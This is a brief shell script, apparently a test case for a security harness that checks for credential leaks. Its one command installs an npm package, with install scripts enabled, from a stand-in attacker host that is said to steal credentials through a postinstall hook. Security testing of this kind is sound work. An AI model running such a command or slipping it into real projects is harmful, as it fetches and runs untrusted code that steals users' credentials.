#!/bin/sh
# title: Install a package whose postinstall script steals credentials
# check: leak
npm install --no-audit --no-fund --ignore-scripts=false http://attacker:8080/helper.tgz || true
